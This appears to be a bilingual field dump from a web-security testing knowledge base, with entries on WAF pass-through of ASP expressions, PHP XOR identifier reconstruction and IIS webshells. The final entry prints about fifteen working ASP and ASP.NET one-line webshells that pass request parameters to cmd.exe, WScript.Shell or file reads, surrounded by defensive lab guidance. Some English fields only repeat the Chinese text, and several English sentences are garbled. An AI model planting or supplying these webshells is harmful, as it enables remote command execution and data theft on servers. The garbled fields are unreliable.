analysis.zh: 该条目的最大可证结论是 ASP 页面引擎解释了常量内联表达式。响应 test、WAF 放行或模板编译均不证明命令执行；只有后续存在用户可控表达式和危险调用时才需要独立升级评估。
analysis.en: The strongest conclusion for this entry is that an ASP page engine interpreted a constant inline expression. A test response, WAF acceptance, or template compilation does not prove command execution; any user-controlled expression and dangerous invocation requires a separate escalation assessment.

opsecTips.zh: 页面只输出固定常量且部署在隔离站点；禁止加入请求数据、COM/.NET 对象或文件操作
opsecTips.en: Keep the page in an isolated site with constant output only; do not add request data, COM or .NET objects, or file operations.

opsecTips.zh: 验证后删除页面、回收应用池并清理模板缓存，确认上传目录未获得脚本权限
opsecTips.en: After validation delete the page, recycle the application pool, clear template caches, and confirm upload storage gained no script permission.

title.zh: WAF 对 ASP 表达式的传递对照
title.en: WAF Pass-Through Control for ASP Expressions

description.zh: 保留源中的第二份同一行以比较 WAF 前后字节；输出 test 只证明表达式解释，不证明安全控制被绕过。
description.en: Preserves the source's second copy to compare bytes before and after the WAF; emitting test proves expression interpretation only, not a security-control bypass.

title.zh: 确认页面处理器映射

description.zh: 记录扩展名、应用池、Classic ASP/ASP.NET 版本和纯文本基线。
description.en: Record extension, application pool, Classic ASP or ASP.NET version, and the plain-text baseline.

title.zh: 部署常量表达式对照

description.zh: 只部署原始一行，不拼接变量、请求参数或对象方法。
description.en: Deploy only the original line without variables, request parameters, or object methods.

title.zh: 限定结论为表达式解释
title.en: Limit the conclusion to expression interpretation

description.zh: 匹配模板处理日志与常量输出，明确没有命令、文件或网络副作用。
description.en: Match template-processing logs with constant output and document the absence of command, file, or network side effects.

title.zh: 移除上传目录脚本映射
title.en: Remove script mapping from upload storage

description.zh: 修复后在批准页面和上传目录分别回归，确认前者渲染、后者返回静态源码。
description.en: After remediation regress an approved page and upload storage separately, confirming rendering in the former and static source in the latter.

overview.zh: `<%= expression %>` 是服务端页面中的内联输出形式，具体语义取决于 Classic ASP 或 ASP.NET 页面引擎。原行只有字符串常量，可安全用作处理器识别和 WAF 传递的阴性对照。
overview.en: `<%= expression %>` 是服务端页面中的内联输出形式，具体语义取决于 Classic ASP 或 ASP.NET 页面引擎。原行只有字符串常量，可安全用作处理器识别和 WAF 传递的阴性对照。

vulnerability.zh: 只有当攻击者能让不可信内容成为服务器端表达式，或控制表达式调用危险对象时，才可能形成代码注入。静态页面输出 test 只是配置证据，不能升级为 WebShell、SSTI 或 RCE。
vulnerability.en: 只有当攻击者能让不可信内容成为服务器端表达式，或控制表达式调用危险对象时，才可能形成代码注入。静态页面输出 test 只是配置证据，不能升级为 Web Shell、SSTI 或 RCE。

exploitation.zh: 先以纯文本文件证明 `<%=` 未被解释，再在隔离 ASP 页面中放入原行并记录处理器、模板编译与响应。阳性仅为服务器输出 test；若源码原样返回、下载或 404，则处理器未解释。此对照不执行后续利用。
exploitation.en: First prove that a plain-text file does not interpret <%=, then place the source line in an isolated ASP page and record handler, template compilation, and response. A positive is limited to the server emitting test; returned source, download behavior, or 404 means no interpretation. This control does not proceed to exploitation.

mitigation.zh: 上传和用户内容目录禁用 ASP/ASP.NET 脚本映射，模板只能来自受信构建产物，动态数据采用上下文编码。回归应保持已批准页面渲染，同时用户文件始终作为静态内容。
mitigation.en: Disable ASP and ASP.NET script mappings in upload and user-content directories, source templates only from trusted build artifacts, and contextually encode dynamic data. Regression should preserve approved rendering while always serving user files as static content.

name.zh: PHP XOR 标识符重建样例

description.zh: 使用字符串异或尝试重建函数名并动态调用，验证无字母数字表达式与 PHP 运行时语义；部分样例可能只构造无效标识符。
description.en: Uses string XOR operations to reconstruct and dynamically invoke identifiers, testing non-alphanumeric PHP expressions while recognizing that some samples may build invalid identifiers.

subCategory.zh: PHP 字符串异或与动态调用
subCategory.en: PHP String XOR and Dynamic Calls

prerequisites.zh: 已固定“PHP XOR 标识符重建样例”使用的 WAF 规则集、PHP 版本、源站处理器和请求路径，并确认：攻击者控制可执行 PHP 表达式，动态函数调用未受限制，且边缘规则只检查字母数字关键字。
prerequisites.en: The WAF ruleset, PHP version, origin handler, and request path for PHP XOR Identifier Reconstruction Samples are pinned, confirming that the attacker controls executable PHP expressions, dynamic calls are unrestricted, and edge rules inspect only alphanumeric keywords.

prerequisites.zh: 隔离站点可同时取得 WAF 动作、PHP lint/运行结果和每个 XOR 子表达式的十六进制结果、最终标识符、is_callable 结果与无害调用输出能够对应。
prerequisites.en: The isolated site can capture WAF action, PHP lint or runtime results, and hex output of each XOR subexpression, final identifier, is_callable result, and harmless invocation output correlate.

title.zh: 标准测试

description.zh: 标准payload
description.en: Standard payloads

analysis.zh: 阳性要求同一输入被 WAF 放行、在目标 PHP 版本语法有效、到达可执行位置并取得每个 XOR 子表达式的十六进制结果、最终标识符、is_callable 结果与无害调用输出能够对应。放行但 lint 失败、函数在该版本失效、仅返回源码或未进入 PHP handler 均为假阳性，不能证明“字符串异或的实际结果是否形成可调用标识符，以及 WAF 对运算表达式与运行时函数名的理解是否一致”。
analysis.en: A positive requires WAF acceptance, valid target-version PHP syntax, arrival at an executable location, and hex output of each XOR subexpression, final identifier, is_callable result, and harmless invocation output correlate. Failed lint, removed semantics, source-only responses, or no PHP handler are false positives and do not prove whether string XOR results form callable identifiers and whether the WAF agrees with the runtime function name produced by the expression.

opsecTips.zh: PHP XOR 标识符重建样例停止条件：所有系统命令替换为局部变量或固定字符串；若源站执行非标记函数、产生外连或写入 Web 目录，立即禁用测试路由。 本条重点观察“字符串异或的实际结果是否形成可调用标识符，以及 WAF 对运算表达式与运行时函数名的理解是否一致”。
opsecTips.en: PHP XOR Identifier Reconstruction Samples stop condition: Replace system commands with local variables or fixed strings; disable the route if the origin invokes a non-marker function, connects outward, or writes web storage. The entry-specific focus is whether string XOR results form callable identifiers and whether the WAF agrees with the runtime function name produced by the expression.

opsecTips.zh: PHP XOR 标识符重建样例清理条件：完成后删除测试 PHP 文件，清理 opcode、WAF 与 CDN 缓存并恢复规则快照，再用正常请求确认没有遗留阻断或宽泛例外。 清理完成后再次确认该技术路径没有残留可触发状态。
opsecTips.en: PHP XOR Identifier Reconstruction Samples cleanup condition: Remove test PHP files, clear opcode, WAF, and CDN caches, restore the rules snapshot, and verify normal requests have no residual block or broad exception. Recheck that no triggerable state remains for this technique.

title.zh: PHP WAF绕过: 无字母数字RCE
title.en: Validation step 1 for PHP XOR Identifier Reconstruction Samples

description.zh: PHP WAF绕过: 无字母数字RCE，共3条
description.en: bypass payloads

title.zh: 固定“PHP XOR 标识符重建样例”多层版本
title.en: Pin the PHP XOR Identifier Reconstruction Samples processing versions

description.zh: 记录 WAF 规则、PHP 版本、源站处理器与请求路径，核对前提“攻击者控制可执行 PHP 表达式，动态函数调用未受限制，且边缘规则只检查字母数字关键字”。
description.en: Record WAF rules, PHP version, origin handler, and request path, confirming that the attacker controls executable PHP expressions, dynamic calls are unrestricted, and edge rules inspect only alphanumeric keywords.

title.zh: 执行 PHP 语法与基线检查
title.en: Run PHP syntax and baseline checks

description.zh: 先对原行做 lint 并保存未变形请求基线，采用“每个 XOR 子表达式的十六进制结果、最终标识符、is_callable 结果与无害调用输出能够对应”区分放行、语法失败与真实执行。
description.en: Lint original lines and record an unmodified request baseline, using hex output of each XOR subexpression, final identifier, is_callable result, and harmless invocation output correlate to separate acceptance, syntax failure, and execution.

title.zh: 单变量验证“PHP XOR 标识符重建样例”
title.en: Run a single-variable PHP XOR Identifier Reconstruction Samples check

description.zh: 测试步骤为：先在目标 PHP 版本打印每个 XOR 结果并调用 is_callable，仅对有效标识符使用固定无副作用函数，避免直接执行原命令。只改变一种词法或编码形式，实际运行使用无害 PHP 表达式。
description.en: print every XOR result and call is_callable on the target PHP version, using only a fixed side-effect-free function for valid identifiers instead of executing original commands. Change one lexical or encoding form and use a harmless PHP expression at runtime.

title.zh: 统一规范化并移除求值路径

description.zh: 实施“禁止不可信 PHP 求值和动态函数名，WAF 对规范化后的语法树进行检测，并将无效样例明确标为检测素材”并重放所有有效与无效行，确认源站不可执行且 WAF 结论与 PHP parser 一致。
description.en: Apply prohibit untrusted PHP evaluation and dynamic function names, inspect normalized syntax trees at the WAF, and label invalid samples explicitly as detection material and replay valid and invalid lines to prove the origin is non-executable and WAF decisions match the PHP parser.

overview.zh: PHP XOR 标识符重建样例用于比较安全设备、PHP lexer 与运行时对同一输入的处理，核心问题是字符串异或的实际结果是否形成可调用标识符，以及 WAF 对运算表达式与运行时函数名的理解是否一致。成立前提为：攻击者控制可执行 PHP 表达式，动态函数调用未受限制，且边缘规则只检查字母数字关键字。判定必须包含每个 XOR 子表达式的十六进制结果、最终标识符、is_callable 结果与无害调用输出能够对应，WAF 放行但语法无效的样例应明确记录为阴性。
overview.en: PHP XOR Identifier Reconstruction Samples compares security-device, PHP lexer, and runtime handling of the same input, focusing on whether string XOR results form callable identifiers and whether the WAF agrees with the runtime function name produced by the expression. It applies when the attacker controls executable PHP expressions, dynamic calls are unrestricted, and edge rules inspect only alphanumeric keywords. Evidence requires hex output of each XOR subexpression, final identifier, is_callable result, and harmless invocation output correlate; WAF acceptance of invalid syntax is a negative result.

vulnerability.zh: 多层差异出现在攻击者控制可执行 PHP 表达式，动态函数调用未受限制，且边缘规则只检查字母数字关键字时，可能造成“字符串异或的实际结果是否形成可调用标识符，以及 WAF 对运算表达式与运行时函数名的理解是否一致”。应用漏洞仍以最终可执行 PHP 数据流为前提，边缘规则只是纵深防御；若 PHP lint、版本语义或运行结果不成立，就不能依据规则未命中确认 RCE。
vulnerability.en: A differential appears when the attacker controls executable PHP expressions, dynamic calls are unrestricted, and edge rules inspect only alphanumeric keywords, potentially causing whether string XOR results form callable identifiers and whether the WAF agrees with the runtime function name produced by the expression. The application finding still requires an executable PHP data flow and the edge rule is only defense in depth; failed lint, incompatible semantics, or absent execution precludes RCE.

exploitation.zh: 先在目标 PHP 版本打印每个 XOR 结果并调用 is_callable，仅对有效标识符使用固定无副作用函数，避免直接执行原命令。固定 PHP、WAF 和源站版本，先做语法检查，再以一次性局部变量或固定字符串替代系统命令；每轮只改变一种大小写、编码、注释或运算形式，并通过请求 ID 关联各层结果。
exploitation.en: print every XOR result and call is_callable on the target PHP version, using only a fixed side-effect-free function for valid identifiers instead of executing original commands. Pin PHP, WAF, and origin versions, lint first, replace system commands with a one-time local variable or fixed string, change one case, encoding, comment, or operator form per run, and correlate layers by request ID.

mitigation.zh: 禁止不可信 PHP 求值和动态函数名，WAF 对规范化后的语法树进行检测，并将无效样例明确标为检测素材。回归应同时覆盖合法 PHP 业务、原始异常行和同义变体，确认上传/写入边界不可执行、运行时不再动态求值，且 WAF 与应用采用一致的规范化模型。
mitigation.en: prohibit untrusted PHP evaluation and dynamic function names, inspect normalized syntax trees at the WAF, and label invalid samples explicitly as detection material. Regression should cover valid PHP behavior, original abnormal lines, and semantic variants while proving upload or write storage is non-executable, runtime evaluation is removed, and WAF and application normalization agree.

name.zh: Classic ASP 与 ASP.NET WebShell 处理器
name.en: Classic ASP and ASP.NET Webshell Handlers

description.zh: 覆盖 Classic ASP eval/execute、ASP.NET C#/VB 页面、ASHX 处理器、ProcessStartInfo 与文件读取形式，按运行时区分同一 IIS 家族的 WebShell。
description.en: Covers Classic ASP eval or execute, ASP.NET C# and VB pages, ASHX handlers, Process Start Info, and file reads, distinguishing runtimes within the IIS family.

prerequisites.zh: 已在授权隔离环境定位“Classic ASP 与 ASP.NET WebShell 处理器”的真实输入点、处理器和运行时版本，并确认：攻击者能将对应扩展文件写入 IIS 可执行目录，处理器映射启用，并且应用池身份具有子进程或文件权限。
prerequisites.en: The authorized isolated environment identifies the real input, handler, and runtime version for Classic ASP and ASP.NET Webshell Handlers, confirming that an attacker can place the relevant extension in an executable IIS directory, handler mapping is enabled, and the application-pool identity has child-process or file privileges.

prerequisites.zh: 测试 worker 可随时销毁，并能同时观察最终文件扩展与处理器、应用池日志、请求参数、固定输出和进程或文件审计事件完整关联。
prerequisites.en: The test worker is disposable and can observe the final extension and handler, application-pool logs, request value, fixed output, and process or file audit event fully correlate.

title.zh: ASP/ASPX一句话木马
title.en: Validation step 1 for Classic ASP and ASP.NET Webshell Handlers

execution.command:
<%eval request("cmd")%>
<%execute request("cmd")%>
<%=request("cmd")%>
<%response.write server.createobject("wscript.shell").exec("cmd.exe /c "&request("cmd")).stdout.readall%>
<%@ Page Language="C#" %>
<% Response.Write(new System.Diagnostics.Process{StartInfo=new System.Diagnostics.ProcessStartInfo{FileName="cmd.exe",Arguments="/c "+Request["cmd"],UseShellExecute=false,RedirectStandardOutput=true}}.Start().StandardOutput.ReadToEnd()); %>
<% Response.Write(System.Text.Encoding.UTF8.GetString(System.Convert.FromBase64String(Request["cmd"]))); %>
<%@ Page Language="VB" %>
<% Response.Write(CreateObject("WScript.Shell").Exec("cmd.exe /c " & Request("cmd")).StdOut.ReadAll()) %>
<script runat="server">void Page_Load(object sender,EventArgs e){Response.Write(System.Diagnostics.Process.Start("cmd.exe","/c "+Request["cmd"]).StandardOutput.ReadToEnd());}</script>
<script runat="server">void Page_Load(object sender,EventArgs e){Response.Write(new System.IO.StreamReader(System.Diagnostics.Process.Start("cmd.exe","/c "+Request["cmd"]).StandardOutput.BaseStream).ReadToEnd());}</script>
<%@ WebHandler Language="C#" Class="Handler" %>
public class Handler : IHttpHandler { public void ProcessRequest(HttpContext context) { context.Response.Write(System.Diagnostics.Process.Start("cmd.exe", "/c " + context.Request["cmd"]).StandardOutput.ReadToEnd()); } public bool IsReusable { get { return true; } } }
<% var p = new System.Diagnostics.Process(); p.StartInfo.FileName = "cmd.exe"; p.StartInfo.Arguments = "/c " + Request["cmd"]; p.StartInfo.UseShellExecute = false; p.StartInfo.RedirectStandardOutput = true; p.Start(); Response.Write(p.StandardOutput.ReadToEnd()); %>
<% Response.Write(System.IO.File.ReadAllText(Request["file"])); %>
<% Response.Write(Server.UrlDecode(Request["cmd"])); %>
<% var psi = new System.Diagnostics.ProcessStartInfo(); psi.FileName = "cmd.exe"; psi.Arguments = "/c " + Request["cmd"]; psi.UseShellExecute = false; psi.RedirectStandardOutput = true; var p = System.Diagnostics.Process.Start(psi); Response.Write(p.StandardOutput.ReadToEnd()); %>
<% var proc = new System.Diagnostics.Process(); proc.StartInfo = new System.Diagnostics.ProcessStartInfo("cmd.exe", "/c " + Request["cmd"]) { UseShellExecute = false, RedirectStandardOutput = true }; proc.Start(); Response.Write(proc.StandardOutput.ReadToEnd()); %>

description.zh: ASP/ASPX一句话木马包含多个可复现输入样例；应逐条测试并记录响应与日志差异。
description.en: Run this Classic ASP and ASP.NET Webshell Handlers validation command in an authorized lab, preserve the output, and compare it with the documented baseline.

analysis.zh: 阳性要求可控输入连续到达危险运行时 API，并取得最终文件扩展与处理器、应用池日志、请求参数、固定输出和进程或文件审计事件完整关联。代码片段、语法错误、HTTP 200、参数回显，或在已有本地 Shell 中手工运行命令均属假阳性或前置能力，不能证明“IIS 根据 .asp、.aspx 或 .ashx 选择的运行时是否将请求参数传入动态代码、cmd.exe、PowerShell 或文件读取 API”。
analysis.en: A positive requires a continuous path from controllable input to a dangerous runtime API plus the final extension and handler, application-pool logs, request value, fixed output, and process or file audit event fully correlate. Snippets, syntax errors, HTTP 200, reflection, or manual commands after an existing shell are false positives or prerequisites and do not prove whether the IIS runtime selected for asp, aspx, or ashx passes request values into dynamic code, cmd.exe, PowerShell, or file-read AP Is.

opsecTips.zh: Classic ASP 与 ASP.NET WebShell 处理器停止条件：“Classic ASP 与 ASP.NET WebShell 处理器”只允许使用一次性固定标记；出现非预期子进程、外部网络、文件写入或权限变化时，立即终止 worker 并停止测试。 本条重点观察“IIS 根据 .asp、.aspx 或 .ashx 选择的运行时是否将请求参数传入动态代码、cmd.exe、PowerShell 或文件读取 API”。
opsecTips.en: Classic ASP and ASP.NET Webshell Handlers stop condition: Use only a one-time fixed marker for Classic ASP and ASP.NET Webshell Handlers; terminate the worker and stop on unexpected child processes, external network, writes, or privilege changes. The entry-specific focus is whether the IIS runtime selected for asp, aspx, or ashx passes request values into dynamic code, cmd.

opsecTips.zh: Classic ASP 与 ASP.NET WebShell 处理器清理条件：结束后删除标记与临时脚本，关闭全部子进程，重建 worker，并确认日志未残留凭据、命令输出或业务数据。 清理完成后再次确认该技术路径没有残留可触发状态。
opsecTips.en: Classic ASP and ASP.NET Webshell Handlers cleanup condition: Remove markers and temporary scripts, terminate child processes, rebuild the worker, and verify logs contain no credentials, command output, or business data. Recheck that no triggerable state remains for this technique.

title.zh: 确认“Classic ASP 与 ASP.NET WebShell 处理器”执行入口
title.en: Confirm the Classic ASP and ASP.NET Webshell Handlers execution entry

description.zh: 定位真实输入、处理器与最终 API，核对前提“攻击者能将对应扩展文件写入 IIS 可执行目录，处理器映射启用，并且应用池身份具有子进程或文件权限”，并记录运行时版本和服务身份。
description.en: Locate the real input, handler, and final API, confirm that an attacker can place the relevant extension in an executable IIS directory, handler mapping is enabled, and the application-pool identity has child-process or file privileges, and record runtime version and service identity.

title.zh: 建立“IIS ASP/ASP.NET WebShell”安全基线
title.en: Establish the IIS ASP and ASP.NET Webshells baseline

description.zh: 使用普通参数或固定业务操作保存正常响应、进程和文件行为，并采用“最终文件扩展与处理器、应用池日志、请求参数、固定输出和进程或文件审计事件完整关联”作为异常证据。
description.en: Use normal parameters or a fixed business operation to record response, process, and file behavior, accepting the final extension and handler, application-pool logs, request value, fixed output, and process or file audit event fully correlate as abnormal evidence.

title.zh: 逐行验证“Classic ASP 与 ASP.NET WebShell 处理器”
title.en: Validate Classic ASP and ASP.NET Webshell Handlers line by line

description.zh: 测试步骤为：在隔离 IIS 中按 Classic ASP、ASP.NET Page 与 ASHX 分组，只使用固定 echo 或测试文件标记，记录缺少 RedirectStandardOutput 等导致的无效行。每轮只替换一行，所有命令、路径与网络地址均改为隔离的无害标记。
description.en: group tests by Classic ASP, ASP.NET Page, and ASHX in isolated IIS, use only fixed echo or test-file markers, and record invalid forms such as missing redirected output. Replace one line per run and substitute every command, path, and network destination with an isolated harmless marker.
